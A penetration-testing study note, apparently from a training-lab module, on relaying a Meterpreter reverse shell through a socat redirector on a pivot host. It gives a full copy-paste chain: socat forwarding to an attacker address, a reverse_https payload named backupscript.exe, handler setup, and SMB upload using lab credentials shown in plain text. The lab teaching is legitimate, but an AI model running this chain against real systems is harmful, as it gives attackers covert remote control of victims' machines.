# 06 — Socat Redirection with a Reverse Shell

> Socat acts as a dumb TCP forwarder on the pivot — no SSH, no Meterpreter session needed on the pivot itself. The pivot just relays bytes between the target and your attack box.

---

## How It Works

```
Windows Target
    │  reverse_https → 172.16.5.129:8080 (pivot's internal IP)
    ▼
Ubuntu Pivot  [socat TCP4-LISTEN:8080 → TCP4:ATTACKER_IP:80]
    │  forwards all bytes to attack box port 80
    ▼
Attack Box  [multi/handler listening on 0.0.0.0:80]
    │  catches the Meterpreter session
    ▼
meterpreter > getuid
```

Key distinction from previous methods: the pivot runs **nothing but socat** — no Meterpreter session, no SSH tunnel, no route table modifications. Socat blindly forwards TCP streams.

---

## When to Use Socat Redirection

| Method | Requires on pivot | Best for |
|--------|-------------------|----------|
| SSH `-L` / `-D` | SSH creds/keys | Interactive enumeration, SOCKS |
| Meterpreter + autoroute | Meterpreter session | Full subnet pivoting via MSF |
| **Socat redirect** | **Socat binary + shell access** | **Simple relay — no MSF session on pivot needed** |

Socat is pre-installed on most Linux systems. Good fallback when you can't get a Meterpreter session on the pivot, or want a lightweight redirector.

---

## Step 1 — Start Socat on the Pivot

SSH to the pivot and run socat as a background listener:

```bash
# Syntax: socat TCP4-LISTEN:<pivot_port>,fork TCP4:<attack_box_IP>:<attack_box_port>
ubuntu@Webserver:~$ socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80
```

- `TCP4-LISTEN:8080` — socat listens on the pivot's port 8080 (the port the target will connect to)
- `fork` — handle multiple connections (don't exit after first)
- `TCP4:10.10.14.18:80` — forward all traffic to your attack box on port 80

> The pivot's **internal IP** (`172.16.5.129`) is what goes in the payload — that's what the target can reach. Your **tun0/VPN IP** (`10.10.14.18`) is where socat forwards to.

---

## Step 2 — Generate Windows Payload

The payload points at the **pivot's internal IP** (what the Windows target can reach), not your attack box:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 LPORT=8080 -f exe -o backupscript.exe
```

> Using `reverse_https` here instead of `reverse_tcp` — HTTPS traffic blends in better and the socat relay handles it transparently since socat forwards raw bytes regardless of protocol.

---

## Step 3 — Start Multi/Handler on Attack Box

The handler listens on the **port socat forwards to** (port 80 in this example), not the port the target connects to (8080):

```bash
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 0.0.0.0
msf6 exploit(multi/handler) > set LPORT 80
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:80
```

---

## Step 4 — Execute Payload on Windows Target

Transfer and run `backupscript.exe` on the Windows target. The session arrives via the pivot:

```
[*] https://0.0.0.0:80 handling request from 10.129.202.64  ← pivot's IP, not Windows target's
[*] Meterpreter session 1 opened (10.10.14.18:80 -> 127.0.0.1)

meterpreter > getuid
Server username: INLANEFREIGHT\victor
```

Notice the session shows the **pivot's IP** (`10.129.202.64`) as the source, not the Windows target — socat is the one actually connecting to your handler.

---

## Port Mapping — Don't Get Confused

| What | IP | Port |
|------|----|------|
| Payload `LHOST` | Pivot internal IP (`172.16.5.129`) | `8080` — what Windows dials |
| Socat listens | Pivot (all interfaces) | `8080` — catches the Windows connection |
| Socat forwards to | Attack box tun0 (`10.10.14.18`) | `80` — what your handler listens on |
| Handler `LHOST` | `0.0.0.0` | `80` — catches socat's forwarded stream |

Common mistake: setting `LPORT` on the handler to 8080 (the pivot's listening port) instead of 80 (the port socat actually forwards to).

---

## Full Copy-Pastable Chain

**Step 1 — Start socat redirector on pivot (leave running)**

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 \
  'socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80 &'
```

Or interactively:

```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231
# then on pivot:
socat TCP4-LISTEN:8080,fork TCP4:ATTACKER_IP:80 &
```

**Step 2 — Generate Windows payload (pointing at pivot's internal IP)**

```bash
# Confirm pivot's internal IP first
PIVOT_INTERNAL=$(sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@10.129.91.231 \
  "ip -br a | grep ens224 | awk '{print \$3}' | cut -d/ -f1")
echo "Pivot internal IP: $PIVOT_INTERNAL"

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$PIVOT_INTERNAL LPORT=8080 -f exe -o /tmp/backupscript.exe
```

**Step 3 — Start handler on attack box (in msfconsole)**

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 80
run
```

**Step 4 — Transfer payload to Windows target and execute**

```bash
# Via SMB (if creds available)
proxychains4 -q smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
  -c 'put /tmp/backupscript.exe Users\victor\Downloads\backupscript.exe'

# Then execute via WMI or RDP — or drop via an existing shell
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| Socat exits immediately | Missing `fork` option — socat exits after first connection without it |
| Session shows `127.0.0.1` as source | Normal — socat is the actual connector; session still works |
| Handler gets no connection | Confirm socat is running on pivot: `ss -tlnp \| grep 8080` |
| `reverse_https` cert error on target | Normal self-signed cert — MSF handles it automatically |
| Wrong port on handler | Handler port = socat's **forward** port, not its **listen** port |
| Payload fails to connect | Check `LHOST` in payload = pivot's **internal** IP, reachable by the target |

---

## Key Takeaways

1. **Socat = dumb byte forwarder.** It doesn't care about protocol — TCP, HTTPS, whatever — it just moves bytes.
2. **Payload `LHOST`** = pivot's internal IP (what the target can reach). **Handler `LPORT`** = socat's forward port (what your attack box listens on). These are different ports.
3. **`fork` is mandatory** — without it socat handles one connection then dies.
4. The session source IP will be the **pivot's IP**, not the target's — this is expected.
5. No Meterpreter session needed on the pivot — just a shell and socat binary.
6. Useful when you have a simple shell on the pivot but can't or don't want to run a full Meterpreter agent there.

---

## Lab Solution — Section 6 Skills (May 8, 2026)

**Pivot host:** `10.129.91.231` (ACADEMY-PIVOTING-LINUXPIV)
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`

### Q1 — SSH tunneling is required with Socat. True or False? → **False**

Socat creates pipe sockets between two independent network channels **without needing SSH tunneling**. Only a shell on the pivot and the socat binary are required.

---

## References

- Previous: [05-Meterpreter_Tunneling_and_Port_Forwarding.md](05-Meterpreter_Tunneling_and_Port_Forwarding.md)
- Next: [07-Socat_Redirection_with_a_Bind_Shell.md](07-Socat_Redirection_with_a_Bind_Shell.md)
- Socat man page: `man socat`
- Socat cheatsheet: `socat -h 2>&1 | less`
